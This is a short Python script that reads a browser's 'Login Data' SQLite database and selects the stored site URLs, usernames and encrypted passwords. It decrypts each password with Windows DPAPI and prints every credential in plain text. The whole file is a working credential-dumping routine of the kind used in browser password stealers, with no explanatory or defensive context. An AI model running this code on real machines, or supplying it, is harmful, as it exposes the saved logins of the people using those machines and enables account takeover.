import win32crypt
import sqlite3

# Connect to the database
conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

for result in cursor.fetchall():
    # The blob is encrypted via DPAPI
    decrypted = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
    print(f"URL: {result[0]} | User: {result[1]} | Password: {decrypted[1].decode('utf-8')}")
